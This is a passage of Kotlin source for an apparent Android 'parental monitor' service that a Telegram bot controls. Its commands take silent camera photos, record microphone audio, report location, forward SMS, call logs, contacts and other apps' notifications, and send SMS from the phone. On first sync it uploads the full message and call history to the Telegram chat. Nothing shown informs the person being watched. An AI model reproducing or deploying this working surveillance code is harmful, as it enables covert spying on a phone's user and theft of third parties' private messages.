                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Bot command menu registered")
            } else {
                android.util.Log.w("MonitoringService", "Command menu registration failed: ${publicResp.code()}")
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Command menu registration error: ${redactToken(e.message)}")
        }
    }

    private fun mainMenu(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
        fun button(text: String, data: String) =
            com.redeye.parentalmonitor.network.InlineButton(text, data)
        return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
            listOf(
                listOf(button("\uD83D\uDCF8 Photo", "photo"), button("\uD83D\uDCCD Location", "location")),
                listOf(button("\uD83D\uDCDE Calls", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
                listOf(button("\uD83D\uDCF7 Front", "camfront"), button("\uD83D\uDCF7 Back", "camback")),
                listOf(button("⏸️ Pause 60 min", "pause60"), button("▶️ Resume", "resume")),
                listOf(button("\uD83D\uDD0B Battery", "battery"), button("\uD83D\uDCCA Status", "status"))
            )
        )
    }

    private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false, wakeSeen: Boolean = false, senderId: String = "") {
        val nowSec = System.currentTimeMillis() / 1000L
        if (sentAtSec > 0 && nowSec - sentAtSec > COMMAND_MAX_AGE_SEC) {
            serviceScope.launch {
                sendToTelegram("\u23F3\uFE0F Command expired, send again.")
            }
            return
        } else if (sentAtSec > 0 && sentAtSec - nowSec > 300L) {
            serviceScope.launch {
                sendToTelegram("\u23F3\uFE0F Command timestamp is in the future. Check the device clock, then send again.")
            }
            return
        }
        val parts = raw.split(CMD_SPLIT_REGEX, limit = 2)
        val command = parts[0]
        val arg = parts.getOrNull(1)?.trim().orEmpty()
        try {
            handleTelegramCommandInner(command, arg, sentAtSec, senderOk, chatOk, wakeSeen, senderId)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Command failed: $command (${redactToken(e.message)})")
            try {
                val detail = redactToken(e.message).ifEmpty { "unknown error" }
                sendToTelegram("\u26A0\uFE0F Command $command failed ($detail). Please try again or send /help.")
            } catch (_: Exception) {
            }
        }
    }

    private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L, senderOk: Boolean = false, chatOk: Boolean = false, wakeSeen: Boolean = false, senderId: String = "") {
        if (sentAtSec > 0 && command in MUTATING_COMMANDS) {
            val ageSec = System.currentTimeMillis() / 1000L - sentAtSec
            if (ageSec > 300L) {
                sendToTelegram("\u23F3\uFE0F Command $command expired, send again.")
                return
            }
        }
        if (command in MUTATING_COMMANDS || command in SENSITIVE_COMMANDS) {
            if (!senderOk) {
                sendToTelegram("\u26D4 Only the owner can use $command.")
                return
            }
        } else if (!senderOk && !chatOk) {
            sendToTelegram("\u26D4 Only the owner can use $command.")
            return
        }
        when (command) {
            "/photo" -> {
                val lens = arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)
                if (lens.isNotEmpty()) {
                    when (lens) {
                        "belakang", "back" -> preferencesManager.cameraFacing = "back"
                        "depan", "front" -> preferencesManager.cameraFacing = "front"
                        else -> {
                            sendToTelegram("Usage: /photo [front|back]")
                            return
                        }
                    }
                }
                if (preferencesManager.monitoringPaused) {
                    sendToTelegram("⏸️ Monitoring is paused. Send /resume first.")
                } else {
                    sendToTelegram("📸 Taking photo now…")
                    captureAndSendPhoto(reportResult = true)
                }
            }
            "/status" -> {
                val lastSync = preferencesManager.lastSyncTime
                val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
                val photoState = if (isPhotoPaused()) {
                    val leftMin = ((photoPausedElapsed() - System.currentTimeMillis()) / 60_000L).coerceAtLeast(1L)
                    "paused ($leftMin min left)"
                } else if (preferencesManager.cameraInterval <= 0) {
                    "manual only (/photo)"
                } else {
                    "every ${preferencesManager.cameraInterval} min"
                }
                sendToTelegram(
                    buildString {
                        appendLine("📊 <b>Status</b>")
                        appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "PAUSED" else "ON"}")
                        appendLine("Last sync: $lastSyncStr")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                        appendLine("Data interval: ${preferencesManager.syncInterval} min")
                        appendLine("Photos: $photoState")
                        appendLine("Camera: ${preferencesManager.cameraFacing}")
                        appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                        appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
                        appendLine("Background location: ${if (hasBackgroundLocation()) "granted" else "MISSING"}")
                        appendLine("Notifications: ${if (isNotifForwarding()) "forwarding" else "off"}")
                        appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
                    }
                )
            }
            "/lastcalls" -> {
                val calls = callLogRepository.getAllCalls(5)
                if (calls.isEmpty()) {
                    sendToTelegram("📞 No call history found.")
                } else {
                    sendToTelegram(formatCallMessage(calls))
                }
            }
            "/lastsms" -> {
                val sms = smsRepository.getRecentSms(5)
                if (sms.isEmpty()) {
                    sendToTelegram("💬 No SMS found.")
                } else {
                    sendToTelegram(formatSmsMessage(sms))
                }
            }
            "/photointerval" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(0, 60)
                if (minutes == null) {
                    sendToTelegram("Usage: /photointerval \u003c0-60\u003e (0 = manual only)")
                } else if (minutes == 0) {
                    preferencesManager.cameraInterval = 0
                    sendToTelegram("📸 Automatic photos OFF. Use /photo for manual capture.")
                } else {
                    preferencesManager.cameraInterval = minutes
                    sendToTelegram("📸 Photo interval set to $minutes min.")
                }
            }
            "/pause" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(1, 480)
                if (minutes == null) {
                    sendToTelegram("Usage: /pause \u003cminutes\u003e (1-480)")
                } else {
                    preferencesManager.photoPausedUntil = System.currentTimeMillis() + minutes * 60_000L
                    sendToTelegram("⏸️ Photos paused for $minutes min.")
                }
            }
            "/battery" -> {
                val batteryManager = getSystemService(BATTERY_SERVICE) as BatteryManager
                val level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                val levelText = if (level in 0..100) "$level%" else "unknown"
                sendToTelegram("🔋 <b>Battery</b>\nLevel: $levelText")
            }
            "/stop" -> {
                preferencesManager.monitoringPaused = true
                sendToTelegram("⏸️ Monitoring paused (calls, SMS, photos and notification forwarding). Send /resume to restart.")
            }
            "/resume" -> {
                preferencesManager.monitoringPaused = false
                preferencesManager.photoPausedUntil = 0L
                sendToTelegram("▶️ Monitoring resumed.")
            }
            "/location" -> {
                if (!hasLocationPermission()) {
                    sendToTelegram("⚠️ Location permission missing. Open Setup and grant Location permission.")
                } else {
                    sendToTelegram("📍 Locating…")
                    serviceScope.launch {
                        val location = fetchLocation()
                        if (location == null) {
                            sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
                        } else {
                            sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
                    }
                    }
                }
            }
            "/camera" -> {
                when (arg.lowercase(java.util.Locale.ROOT)) {
                    "belakang", "back" -> {
                        preferencesManager.cameraFacing = "back"
                        sendToTelegram("📸 Camera set to back.")
                    }
                    "depan", "front" -> {
                        preferencesManager.cameraFacing = "front"
                        sendToTelegram("📸 Camera set to front.")
                    }
                    else -> {
                        sendToTelegram("Usage: /camera \u003cfront|back\u003e (now: ${preferencesManager.cameraFacing})")
                    }
                }
            }
            "/notif" -> {
                when (arg.lowercase(java.util.Locale.ROOT)) {
                    "on" -> {
                        preferencesManager.notifForwardEnabled = true
                        if (isNotifForwarding()) {
                            sendToTelegram("\uD83D\uDD14 Notification forwarding ON.")
                        } else {
                            sendToTelegram("Notif forwarding enabled, but OS notification access is missing. Open Setup and tap Read Notifications to allow it.")
                        }
                    }
                    "off" -> {
                        preferencesManager.notifForwardEnabled = false
                        sendToTelegram("\uD83D\uDD15 Notification forwarding OFF.")
                    }
                    "status", "" -> {
                        val state = if (isNotifForwarding()) "forwarding" else "off"
                        sendToTelegram("\uD83D\uDD14 Notifications: $state (pref: ${if (preferencesManager.notifForwardEnabled) "on" else "off"})")
                    }
                    else -> {
                        sendToTelegram("Usage: /notif <on|off|status>")
                    }
                }
            }
            "/log" -> {
                val crash = try {
                    CrashReporter.pendingReport(this)
                } catch (_: Exception) {
                    null
                }
                if (crash != null) {
                    sendToTelegram(crash.replace(TAG_STRIP_REGEX, ""))
                    CrashReporter.clearPending(this)
                } else {
                    sendToTelegram("\uD83E\uDDFE No crash recorded.")
                }
                sendToTelegram(
                    buildString {
                        appendLine("\uD83E\uDDFE <b>Error log</b>")
                        val credErr = try {
                            preferencesManager.credentialError
                        } catch (_: Exception) {
                            ""
                        }
                        appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "FAILED ($credErr)")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                        appendLine("Storage: " + if (preferencesManager.isStorageEncrypted) "encrypted" else "volatile")
                        val camErr = try {
                            preferencesManager.lastCameraErrorNotice
                        } catch (_: Exception) {
                            0L
                        }
                        appendLine("Last camera error: " + if (camErr > 0) formatDate(camErr) else "none")
                        val upErr = try {
                            preferencesManager.lastUploadErrorNotice
                        } catch (_: Exception) {
                            0L
                        }
                        appendLine("Last upload error: " + if (upErr > 0) formatDate(upErr) else "none")
                    }
                )
            }
            "/syncinterval" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(1, 1440)
                if (minutes == null) {
                    sendToTelegram("Usage: /syncinterval \u003c1-1440\u003e (minutes)")
                } else {
                    preferencesManager.syncInterval = minutes
                    try {
                        restartAllLoops()
                    } catch (_: Exception) {
                    }
                    sendToTelegram("\u23F1\uFE0F Sync interval set to $minutes min.")
                }
            }
            "/restart" -> {
                restartAllLoops()
                sendToTelegram("\u267B\uFE0F Loops restarted.")
            }
            "/flush" -> {
                val queued = messageQueue.getQueueSize()
                if (NetworkUtils.isAuthBlocked(preferencesManager)) {
                    sendToTelegram("⚠️ Flush delayed: bot credentials rejected (${preferencesManager.credentialError}). Fix the token in Setup.")
                    return
                }
                serviceScope.launch {
                    try {
                        flushPendingAudio()
                    } catch (_: Exception) {
                    }
                    try {
                        flushPendingPhotos()
                    } catch (_: Exception) {
                    }
                }
                val scheduled = MessageScheduler.scheduleMessageSend(this)
                if (scheduled) {
                    sendToTelegram("\uD83D\uDCE4 Flush scheduled ($queued queued). Sending when online.")
                } else {
                    sendToTelegram("\u26A0\uFE0F Could not schedule flush ($queued queued).")
                }
            }
            "/clearqueue" -> {
                val queued = messageQueue.getQueueSize()
                try {
                    messageQueue.clearQueue()
                } catch (_: Exception) {
                }
                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped).")
            }
            "/lock" -> {
                try {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                    val admin = android.content.ComponentName(this, com.redeye.parentalmonitor.receiver.AdminReceiver::class.java)
                    if (!dpm.isAdminActive(admin)) {
                        sendToTelegram("\u26A0\uFE0F Device Admin not active. Enable it in Setup first.")
                    } else {
                        dpm.lockNow()
                        sendToTelegram("\uD83D\uDD12 Device locked.")
                    }
                } catch (e: SecurityException) {
                    sendToTelegram("\u26A0\uFE0F Cannot lock: Device Admin not active.")
                } catch (e: Exception) {
                    sendToTelegram("\u26A0\uFE0F Lock failed.")
                }
            }
            "/ring" -> {
                val seconds = if (arg.isEmpty()) 15 else arg.toIntOrNull()?.coerceIn(5, 60)
                if (seconds == null) {
                    sendToTelegram("Usage: /ring [5-60] (seconds)")
                } else if (recordBusy.get()) {
                    sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
                } else if (!ringBusy.compareAndSet(false, true)) {
                    sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
                } else {
                    ringJob = serviceScope.launch {
                        try {
                            ringDevice(seconds)
                        } finally {
                            ringBusy.set(false)
                        }
                    }
                }
            }
            "/ping" -> {
                when (arg.substringBefore(" ").lowercase(java.util.Locale.ROOT)) {
                    "camera", "photo" -> {
                        if (senderOk && !wakeSeen) restartCameraLoop()
                        handleTelegramCommand("/photo", sentAtSec, senderOk, chatOk, wakeSeen, senderId)
                    }
                    "location", "loc", "gps" -> {
                        handleTelegramCommand("/location", sentAtSec, senderOk, chatOk, wakeSeen, senderId)
                    }
                    "" -> {
                        val initialStuck = initialSyncRunning.get() && initialSyncJob?.isActive != true
                        val loopsOk = monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && !initialStuck
                        if (!loopsOk && senderOk && !wakeSeen) restartAllLoops()
                        val tail = if (loopsOk || !senderOk || wakeSeen) "" else " ⏰ Loops restarted."
                        if (sentAtSec > 0) {
                            val lag = System.currentTimeMillis() / 1000L - sentAtSec
                            sendToTelegram("\uD83C\uDFD3 Pong! Delay ${lag.coerceAtLeast(0)} s." + tail)
                        } else {
                            sendToTelegram("\uD83C\uDFD3 Pong! " + TimeFmt.full(System.currentTimeMillis()) + tail)
                        }
                    }
                    else -> {
                        sendToTelegram("Usage: /ping [camera|location]")
                    }
                }
            }
            "/record" -> {
                val seconds = arg.toIntOrNull()?.coerceIn(5, 60)
                if (seconds == null) {
                    sendToTelegram("Usage: /record \u003c5-60\u003e (seconds)")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
                } else if (ringBusy.get()) {
                    sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
                } else if (!recordBusy.compareAndSet(false, true)) {
                    sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
                } else {
                    sendToTelegram("\uD83C\uDF99\uFE0F Recording $seconds s\u2026")
                    recordJob = serviceScope.launch {
                        try {
                            recordAndSendAudio(seconds)
                        } finally {
                            recordBusy.set(false)
                        }
                    }
                }
            }
            "/sms" -> {
                val number = arg.substringBefore(" ").trim()
                val smsText = arg.substringAfter(" ", "").trim()
                val normalized = if (number.startsWith("+")) "+" + number.drop(1).filter { it.isDigit() } else number.filter { it.isDigit() }
                if (number.isEmpty() || smsText.isEmpty()) {
                    sendToTelegram("Usage: /sms \u003cnumber\u003e \u003cmessage\u003e")
                } else if (number.contains('*') || number.contains('#')) {
                    sendToTelegram("\u26A0\uFE0F Invalid number. Usage: /sms \u003cnumber\u003e \u003cmessage\u003e")
                } else if (!normalized.matches(SMS_NUMBER_REGEX)) {
                    sendToTelegram("\u26A0\uFE0F Invalid number. Usage: /sms \u003cnumber\u003e \u003cmessage\u003e")
                } else if (isPremiumSmsNumber(normalized)) {
                    sendToTelegram("\uD83D\uDEAB Premium numbers are not allowed for /sms.")
                } else if (smsText.length > 500) {
                    sendToTelegram("\u26A0\uFE0F Message too long (max 500 characters).")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
                } else {
                    preferencesManager.pendingSmsNumber = normalized
                    preferencesManager.pendingSmsText = smsText
                    preferencesManager.pendingSmsAt = System.currentTimeMillis()
                    preferencesManager.pendingSmsOwner = senderId
                    sendToTelegram("\uD83D\uDCE9 SMS to <code>$normalized</code> ready to send. Reply /smsconfirm to confirm (valid for 5 minutes).")
                }
            }
            "/smsconfirm" -> {
                val number = preferencesManager.pendingSmsNumber
                val smsText = preferencesManager.pendingSmsText
                val stagedAt = preferencesManager.pendingSmsAt
                val stagedBy = try { preferencesManager.pendingSmsOwner } catch (_: Exception) { "" }
                if (number.isEmpty() || smsText.isEmpty() || stagedAt <= 0L || System.currentTimeMillis() - stagedAt > 300_000L) {
                    preferencesManager.pendingSmsNumber = ""
                    preferencesManager.pendingSmsText = ""
                    preferencesManager.pendingSmsAt = 0L
                    preferencesManager.pendingSmsOwner = ""
                    sendToTelegram("\u23F1\uFE0F No pending SMS. Send /sms \u003cnumber\u003e \u003cmessage\u003e first.")
                } else if (stagedBy.isNotEmpty() && stagedBy != senderId) {
                    sendToTelegram("\u26D4 Only the requester can confirm this SMS.")
                } else if (System.currentTimeMillis() - preferencesManager.lastSmsSendAt < 60_000L) {
                    sendToTelegram("\u26A0\uFE0F Please wait a moment before sending another SMS.")
                } else if (!smsBusy.compareAndSet(false, true)) {
                    sendToTelegram("\u23F1\uFE0F SMS still sending, please wait.")
                } else {
                    sendToTelegram("\uD83D\uDCE9 Sending SMS\u2026")
                    smsJob = serviceScope.launch {
                        try {
                            sendSmsPending(number, smsText)
                        } finally {
                            smsBusy.set(false)
                        }
                    }
                }
            }
            "/lastnotif" -> {
                val items = try {
                    NotificationForwarderService.history()
                } catch (_: Exception) {
                    emptyList()
                }
                if (items.isEmpty()) {
                    sendToTelegram("\uD83D\uDD14 No notifications recorded yet.")
                } else {
                    sendToTelegram(
                        buildString {
                            appendLine("\uD83D\uDD14 <b>Last notifications</b>")
                            for (item in items.takeLast(10)) {
                                appendLine("\u2022 " + Html.escape(item.app) + ": " + Html.escape(item.title.take(80)) + " \u2014 " + Html.escape(item.text.take(120)))
                            }
                        }
                    )
                }
            }
            "/version" -> {
                sendToTelegram(
                    buildString {
                        appendLine("\u2139\uFE0F <b>Version</b>")
                        appendLine("App: " + com.redeye.parentalmonitor.BuildConfig.VERSION_NAME + " (" + com.redeye.parentalmonitor.BuildConfig.VERSION_CODE + ")")
                        appendLine("Android: " + Build.VERSION.SDK_INT + " (" + Build.VERSION.RELEASE + ")")
                        appendLine("Device: " + Build.MANUFACTURER + " " + Build.MODEL)
                    }
                )
            }
            "/uptime" -> {
                val started = serviceStartAt
                if (started <= 0) {
                    sendToTelegram("\u23F1\uFE0F Uptime unknown.")
                } else {
                    val minutes = (System.currentTimeMillis() - started) / 60_000L
                    val hours = minutes / 60
                    val days = hours / 24
                    val span = when {
                        days > 0 -> "$days d ${hours % 24} h"
                        hours > 0 -> "$hours h ${minutes % 60} m"
                        else -> "$minutes m"
                    }
                    sendToTelegram("\u23F1\uFE0F <b>Uptime</b>\nRunning: $span\nSince: " + formatDate(started))
                }
            }
            "/contacts" -> {
                if (arg.isEmpty()) {
                    sendToTelegram("Usage: /contacts \u003cname\u003e")
                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("\u26A0\uFE0F Contacts permission missing. Open Setup and grant Contacts permission.")
                } else {
                    val found = searchContacts(arg.take(40))
                    if (found.isEmpty()) {
                        sendToTelegram("\uD83D\uDC64 No contacts matching that name.")
                    } else {
                        sendToTelegram(
                            buildString {
                                appendLine("\uD83D\uDC64 <b>Contacts (${found.size})</b>")
                                for (entry in found) {
                                    appendLine("\u2022 " + Html.escape(entry.first) + " \u2014 " + Html.escape(entry.second))
                                }
                            }
                        )
                    }
                }
            }
            "/apps" -> {
                val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
                val apps = listLaunchableApps(limit)
                if (apps.isEmpty()) {
                    sendToTelegram("\uD83D\uDCE6 No apps found.")
                } else {
                    sendToTelegram(
                        buildString {
                            appendLine("\uD83D\uDCE6 <b>Apps (${apps.size})</b>")
                            for (label in apps) {
                                appendLine("\u2022 " + Html.escape(label))
                            }
                        }
                    )
                }
            }
            "/storage" -> {
                val (cacheBytes, cachePhotos) = withContext(Dispatchers.IO) { cacheStats() }
                sendToTelegram(
                    buildString {
                        appendLine("\uD83D\uDCBE <b>Storage</b>")
                        appendLine("Cache: " + formatBytes(cacheBytes) + " (" + cachePhotos + " photos)")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                    }
                )
            }
            "/history" -> {
                val digits = arg.filter { it.isDigit() }
                if (digits.length < 7) {
                    sendToTelegram("Usage: /history \u003cnumber\u003e (min 7 digits)")
                } else {
                    val calls = try {
                        callLogRepository.getCallsForNumber(digits, 50).take(5)
                    } catch (_: Exception) {
                        emptyList()
                    }
                    val sms = try {
                        smsRepository.getSmsForNumber(digits, 50).take(5)
                    } catch (_: Exception) {
                        emptyList()
                    }
                    if (calls.isEmpty() && sms.isEmpty()) {
                        sendToTelegram("\uD83D\uDD0E No history for $digits.")
                    } else {
                        if (calls.isNotEmpty()) sendToTelegram(formatCallMessage(calls))
                        if (sms.isNotEmpty()) sendToTelegram(formatSmsMessage(sms))
                    }
                }
            }
            "/help", "/start" -> {
                if (!senderOk) {
                    sendToTelegram(
                        buildString {
                            appendLine("🤖 <b>Commands</b>")
                            appendLine("/help - show this list")
                        }
                    )
                    return
                }
                sendToTelegram(
                    buildString {
                        appendLine("👆 <b>Tap a button below</b>")
                        appendLine()
                        appendLine("🤖 <b>Commands</b>")
                        appendLine("/photo - take a photo now")
                        appendLine("/camera \u003cfront|back\u003e - switch camera")
                        appendLine("/location - send current location")
                        appendLine("/lastcalls - show last 5 calls")
                        appendLine("/lastsms - show last 5 SMS")
                        appendLine("/photointerval \u003c0-60\u003e - set photo interval (0 = manual)")
                        appendLine("/pause \u003cminutes\u003e - pause photos")
                        appendLine("/battery - show battery level")
                        appendLine("/status - show monitoring status")
                        appendLine("/stop - pause monitoring")
                        appendLine("/resume - resume monitoring")
                        appendLine("/notif <on|off|status> - notif forwarding")
                        appendLine("/syncinterval \u003c1-1440\u003e - set sync interval")
                        appendLine("/restart - restart monitoring loops")
                        appendLine("/flush - send queued messages now")
                        appendLine("/clearqueue - drop queued messages")
                        appendLine("/lock - lock device screen")
                        appendLine("/ring [5-60] - ring device aloud")
                        appendLine("/ping [camera|location] - check delay + wake target")
                        appendLine("/record \u003c5-60\u003e - record audio seconds")
                        appendLine("/sms \u003cnumber\u003e \u003cmessage\u003e - send SMS")
                        appendLine("/smsconfirm - send the confirmed SMS")
                        appendLine("/lastnotif - show last notifications")
                        appendLine("/version - show app/device version")
                        appendLine("/uptime - show service uptime")
                        appendLine("/contacts \u003cname\u003e - search contacts")
                        appendLine("/apps [N] - list installed apps")
                        appendLine("/storage - show storage usage")
                        appendLine("/history \u003cnumber\u003e - calls+SMS by number")
                        appendLine("/log - show last crash/error log")
                        appendLine("/help - show this list")
                    },
                    mainMenu()
                )
            }
            else -> {
                sendToTelegram("\u2753 Unknown command: $command. Send /help for the list.")
            }
        }
    }

    private fun selectedLensFacing(): Int {
        return if (preferencesManager.cameraFacing == "back") {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
        } else {
            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
        }
    }

    private fun isPhotoPaused(): Boolean {
        return System.currentTimeMillis() < photoPausedElapsed()
    }

    private fun photoPausedElapsed(): Long {
        val stored = try {
            preferencesManager.photoPausedUntil
        } catch (_: Exception) {
            0L
        }
        if (stored <= 0L) return 0L
        if (stored < 1_000_000_000_000L) {
            val remaining = stored - android.os.SystemClock.elapsedRealtime()
            val migrated = if (remaining > 0L) System.currentTimeMillis() + remaining else 0L
            try {
                preferencesManager.photoPausedUntil = migrated
            } catch (_: Exception) {
            }
            return migrated
        }
        if (stored - System.currentTimeMillis() > 1440 * 60_000L) {
            try {
                preferencesManager.photoPausedUntil = 0L
            } catch (_: Exception) {
            }
            return 0L
        }
        return stored
    }

    private fun hasBackgroundLocation(): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun isNotifForwarding(): Boolean {
        if (!preferencesManager.notifForwardEnabled) return false
        return try {
            androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        } catch (_: Exception) {
            false
        }
    }

    private fun hasLocationPermission(): Boolean {
        val fine = androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarse = androidx.core.content.ContextCompat.checkSelfPermission(
            this,
            android.Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }

    @Suppress("DEPRECATION")
    private suspend fun fetchLocation(): android.location.Location? {
        if (!hasLocationPermission()) return null
        ensureForegroundTypes()
        return withContext(Dispatchers.IO) {
            try {
                val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                val providers = listOf(
                    android.location.LocationManager.NETWORK_PROVIDER,
                    android.location.LocationManager.GPS_PROVIDER
                ).filter {
                    try {
                        locationManager.isProviderEnabled(it)
                    } catch (_: Exception) {
                        false
                    }
                }
                for (provider in providers) {
                    try {
                        val last = locationManager.getLastKnownLocation(provider)
                        if (last != null && isFreshLocation(last)) {
                            return@withContext last
                        }
                    } catch (_: SecurityException) {
                        return@withContext null
                    }
                }
                if (providers.isEmpty()) return@withContext null
                for (provider in providers) {
                    val result = CompletableDeferred<android.location.Location?>()
                    val listener = object : android.location.LocationListener {
                        override fun onLocationChanged(location: android.location.Location) {
                            result.complete(location)
                        }
                        override fun onProviderDisabled(providerName: String) {}
                        override fun onProviderEnabled(providerName: String) {}
                        override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                    }
                    try {
                        @Suppress("DEPRECATION")
                        locationManager.requestSingleUpdate(provider, listener, android.os.Looper.getMainLooper())
                    } catch (_: SecurityException) {
                        return@withContext null
                    } catch (_: Exception) {
                        continue
                    }
                    try {
                        val fix = withTimeoutOrNull(20_000) { result.await() }
                        if (fix != null) return@withContext fix
                    } finally {
                        try {
                            locationManager.removeUpdates(listener)
                        } catch (_: Exception) {
                        }
                    }
                }
                null
            } catch (_: Exception) {
                null
            }
        }
    }

    private fun setupTapIntent(): android.app.PendingIntent {
        cachedSetupTap?.let { return it }
        val intent = android.content.Intent(this, com.redeye.parentalmonitor.ui.MainActivity::class.java).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
        return android.app.PendingIntent.getActivity(this, 0, intent, android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE).also { cachedSetupTap = it }
    }

    private suspend fun sendInitialData() {
        try {
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting SMS history...")
            val entrySmsId = try { preferencesManager.lastSmsId } catch (_: Exception) { 0L }
            val pendingSms = mutableListOf<com.redeye.parentalmonitor.data.models.SmsData>()
            var smsCursor = entrySmsId
            var smsPages = 0
            var smsLastFull = false
            while (smsPages < 5) {
                val page = try { smsRepository.getNewSms(smsCursor) } catch (_: Exception) { emptyList() }
                if (page.isEmpty()) break
                pendingSms.addAll(page)
                smsCursor = page.maxOf { it.id }
                smsPages++
                smsLastFull = page.size >= 100
                if (page.size < 100) break
            }
            val smsTruncated = smsPages >= 5 && smsLastFull
            pendingSms.sortBy { it.id }
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${pendingSms.size} SMS messages")

            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting call history...")
            val entryCallTs = try { preferencesManager.lastCallTimestamp } catch (_: Exception) { 0L }
            val entryCallId = try { preferencesManager.lastCallId } catch (_: Exception) { 0L }
            val pendingCalls = mutableListOf<com.redeye.parentalmonitor.data.models.CallData>()
            var callTs = entryCallTs
            var callId = entryCallId
            var callPages = 0
            var callLastFull = false
            while (callPages < 5) {
                val page = try { callLogRepository.getNewCalls(callTs, callId) } catch (_: Exception) { emptyList() }
                if (page.isEmpty()) break
                pendingCalls.addAll(page)
                val latest = page.maxWith(compareBy({ it.date }, { it.id }))
                callTs = latest.date
                callId = latest.id
                callPages++
                callLastFull = page.size >= 100
                if (page.size < 100) break
            }
            val callTruncated = callPages >= 5 && callLastFull
            pendingCalls.sortWith(compareBy({ it.date }, { it.id }))
            if (pendingSms.isEmpty() && pendingCalls.isEmpty()) {
                val wasDone = try { preferencesManager.initialSyncDone } catch (_: Exception) { true }
                preferencesManager.initialSyncDone = true
                if (!wasDone) sendToTelegram("Monitoring started. No SMS or call history on this device yet.")
                return
            }
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending start message...")
            val startMessage = buildString {
                appendLine("📱 <b>Monitoring started</b>")
                appendLine()
                appendLine("⏰ Time: ${formatDate(System.currentTimeMillis())}")
                appendLine()
                appendLine("📊 Found on device:")
                appendLine("• SMS: ${pendingSms.size}")
                appendLine("• Calls: ${pendingCalls.size}")
                appendLine()
                appendLine("Sending history...")
            }
            sendToTelegram(startMessage)
            delay(500)
            var initialOk = true

            if (pendingSms.isNotEmpty()) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingSms.size} SMS...")
                val smsTotal = pendingSms.size
                for ((index, part) in pendingSms.chunked(10).withIndex()) {
                    val message = buildString {
                        appendLine("💬 <b>SMS History (${index * 10 + 1}-${index * 10 + part.size} of $smsTotal)</b>")
                        appendLine()
                        part.forEach { sms ->
                            appendLine("📞 Number: ${Html.escape(sms.address)}")
                            val body = Html.escape(sms.body.take(200))
                            appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                            appendLine("🔄 Type: ${sms.getTypeString()}")
                            appendLine("⏰ Time: ${formatDate(sms.date)}")
